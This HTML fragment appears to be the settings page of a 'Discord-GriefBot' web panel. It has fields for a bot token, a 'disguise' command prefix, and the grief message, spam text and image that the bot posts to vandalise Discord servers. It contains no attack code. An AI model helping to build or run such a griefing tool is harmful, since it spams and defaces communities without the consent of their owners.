<body>
    <nav class="navbar navbar-expand-lg bg-transparent">
        <a href="https://github.com/CorruptedBytes/DiscordGriefBot" target="_blank">
            <h2 style="color: white;">Discord-GriefBot</h2>
        </a>
    </nav>
    <div class="alert alert-success" id="alert-success" hidden="true">
        <strong>Success!</strong> Settings have been applied!
    </div>
    <nav id="sidebar" class="active">
        <ul class="list-unstyled components mb-5">
            <li>
                <a href="/dashboard"> Panel</a>
            </li>
            <li>
                <a href="/chat"> Chat</a>
            </li>
            <li>
                <a href="/settings"> Settings</a>
            </li>
        </ul>
    </nav>
    <div class="heading">
        <table>
            <tr>
                <td>
                    <p>Discord Bot-Token</p>
                    <label><input type="password" name="botToken" id="botToken" placeholder="ODc4MjIwNTE4MjEyMzc4NjU0"
                            spellcheck="false" autocomplete="off" required /></label>
                </td>

                <td>
                    <p>Your Discord User ID</p>
                    <label><input type="text" name="userID" id="userID" placeholder="878220518212378654"
                            spellcheck="false" autocomplete="off" required /></label>
                </td>

                <td>
                    <p>Activity Description</p>
                    <label><input type="text" name="activityDescription" id="activityDescription" placeholder="Music"
                            spellcheck="false" autocomplete="off" required /></label>
                </td>

                <td>
                    <p>Disguise Command Prefix</p>
                    <label><input type="text" name="disguiseCommandPrefix" id="disguiseCommandPrefix" placeholder="!"
                            spellcheck="false" autocomplete="off" required /></label>
                </td>
            </tr>
        </table>

        <br /><br /><br />

        <table>
            <tr>                
                <td>
                    <p>Grief Message</p>
                    <label><input type="text" name="griefMessage" id="griefMessage" placeholder="Fucked-by-%s"
                            spellcheck="false" autocomplete="off" required /></label>
                </td>

                <td>
                    <p>Spam Message</p>
                    <label><input type="text" name="spamMessage" id="spamMessage"
                            placeholder="YOUR DISCORD SERVER WAS GRIEFED!" spellcheck="false" autocomplete="off"
                            required /></label>
                </td>

                <td>
                    <p>Grief Picture</p>
                    <label><input type="text" name="griefPicture" id="griefPicture"
                            placeholder="https://0cn.de/z6fv" spellcheck="false" autocomplete="off"
                            required /></label>
                </td>
            </tr>
            <tr>
                <td><a class="btn btn-primary btn-lg" id="submitBtn" role="button">Submit</a></td>
            </tr>
        </table>
    </div>
